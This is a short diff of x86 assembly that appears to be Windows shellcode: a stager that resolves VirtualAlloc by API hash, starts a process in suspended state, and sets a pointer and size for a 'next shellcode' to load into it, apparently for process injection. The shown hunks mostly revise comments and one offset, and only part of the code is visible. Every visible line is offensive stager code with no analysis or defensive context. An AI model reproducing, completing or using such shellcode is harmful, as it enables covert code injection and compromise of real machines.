@@ -11,11 +11,11 @@ xor edi, edi
 push 0x00000004 ;PAGE_READWRITE
 push 0x00001000 ;MEM_COMMIT
 push 0x00000054 ;STARTUPINFO+PROCESS_INFORMATION
-push edi 
-push 0xE553A458 ;call VirtualAlloc() 
-call ebp
+push edi
+push 0xE553A458 ;call VirtualAlloc()
+call ebp                  ;prepare lpStartupInfo
 
-mov dword [eax], 0x44
+mov dword [eax], 0x44 ; cb
 lea esi, [eax+0x44]
 push edi
 push 0x6578652e
@@ -26,7 +26,7 @@ push esi		;lpProcessInformation
 push eax		;lpStartupInfo
 push edi		;lpCurrentDirectory
 push edi		;lpEnvironment
-push 0x00000044	;dwCreationFlags
+push 0x00000044	;dwCreationFlags CREATE_SUSPENDED
 push edi		;bInheritHandles
 push edi		;lpThreadAttributes
 push edi		;lpProcessAttributes
@@ -50,7 +50,7 @@ pop edx
 
 mov edi, eax
 mov ecx, [esi]
-add dword edx, 0x112247   ;pointer on the next shellcode
+add dword edx, 0x3f   ;pointer on the next shellcode
 push esp
 push 0x00001000	;Next Shellcode Size
 push edx		;
